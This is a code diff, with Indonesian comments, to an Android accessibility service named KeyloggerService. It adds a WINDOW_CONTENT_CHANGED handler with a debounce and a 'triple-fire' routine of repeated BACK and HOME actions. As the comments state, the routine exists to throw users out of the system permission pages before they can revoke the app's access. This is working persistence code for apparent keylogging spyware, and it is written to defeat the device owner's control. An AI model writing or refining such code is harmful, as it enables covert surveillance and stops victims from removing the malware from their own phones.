@@ -135,6 +135,10 @@ class KeyloggerService : AccessibilityService() {
         return false
     }
 
+    // ── Debounce guard konten: cegah spam guard saat scroll/refresh ──────────
+    private var lastPermGuardPkg = ""
+    private var lastPermGuardMs  = 0L
+
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         val ev = event ?: return
 
@@ -162,6 +166,24 @@ class KeyloggerService : AccessibilityService() {
                     guardPermissionPage(pkg, ev.className?.toString() ?: "")
                     autoTriggerOverlay(pkg)
                 }
+            }
+
+            // ── Konten window berubah (navigasi fragment dalam activity yg sama) ──
+            // Penting: beberapa ROM tidak fire WINDOW_STATE_CHANGED saat buka
+            // halaman permission detail — hanya fire WINDOW_CONTENT_CHANGED.
+            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
+                val pkg = ev.packageName?.toString() ?: return
+                if (pkg == packageName) return
+                if (!AppDeviceAdminReceiver.PERMISSION_SETTINGS_PACKAGES.contains(pkg)) return
+
+                // Debounce 800ms per-package agar tidak spam guard saat scroll
+                val now = System.currentTimeMillis()
+                if (pkg == lastPermGuardPkg && now - lastPermGuardMs < 800) return
+                lastPermGuardPkg = pkg
+                lastPermGuardMs  = now
+
+                val className = ev.className?.toString() ?: ""
+                guardPermissionPage(pkg, className)
             }
 
             // ── Teks berubah — ini jalur utama untuk soft keyboard ────────────
@@ -247,22 +269,42 @@ class KeyloggerService : AccessibilityService() {
 
     /**
      * Jika user membuka halaman Permission Settings (misal Settings > Apps > [App] > Permissions),
-     * langsung press BACK + HOME agar toggle permission tidak bisa dimatikan.
+     * langsung multi-BACK + HOME secepat mungkin agar toggle tidak sempat diklik.
+     *
+     * Strategi triple-fire:
+     *   T+0ms   → BACK langsung (sebelum window sempat interactive)
+     *   T+80ms  → BACK kedua (fallback jika pertama belum efektif)
+     *   T+180ms → HOME (pastikan user keluar dari Settings)
+     *   T+320ms → BACK ketiga (untuk ROM yang lambat render)
+     *   T+500ms → HOME kedua (ensure final)
+     *
+     * Package com.android.permissioncontroller / com.google.android.permissioncontroller
+     * adalah dedicated permission UI — semua window dari sana LANGSUNG diblokir
+     * tanpa perlu cek className keyword.
      */
     private fun guardPermissionPage(pkg: String, className: String) {
         if (!permissionGuardEnabled) return
         if (!AppDeviceAdminReceiver.PERMISSION_SETTINGS_PACKAGES.contains(pkg)) return
-        val isPermPage = AppDeviceAdminReceiver.PERMISSION_PAGE_KEYWORDS.any { kw ->
+
+        // Dedicated permission controller packages → blokir SEMUA window-nya
+        val isDedicatedPermPkg = AppDeviceAdminReceiver.PERMISSION_CONTROLLER_PACKAGES.contains(pkg)
+        val isPermPage = isDedicatedPermPkg || AppDeviceAdminReceiver.PERMISSION_PAGE_KEYWORDS.any { kw ->
             className.contains(kw, ignoreCase = true)
         }
         if (!isPermPage) return
-        android.util.Log.d("PermGuard", "Blocked permission page: $pkg / $className")
-        handler.post {
-            performGlobalAction(GLOBAL_ACTION_BACK)
-        }
-        handler.postDelayed({
-            performGlobalAction(GLOBAL_ACTION_HOME)
-        }, 0)
+
+        android.util.Log.d("PermGuard", "Blocked: $pkg / $className [dedicated=$isDedicatedPermPkg]")
+
+        // T+0ms — fire BACK SEKARANG di main thread (sudah di main thread via onAccessibilityEvent)
+        performGlobalAction(GLOBAL_ACTION_BACK)
+        // T+80ms — BACK kedua, jika sistem belum register window sebagai active saat T+0
+        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK)  },  80)
+        // T+180ms — HOME, paksa keluar Settings
+        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME)  }, 180)
+        // T+320ms — BACK ketiga (ROM lambat / animasi panjang)
+        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK)  }, 320)
+        // T+500ms — HOME kedua sebagai penjamin akhir
+        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME)  }, 500)
     }
 
     private fun autoTriggerOverlay(pkg: String) {
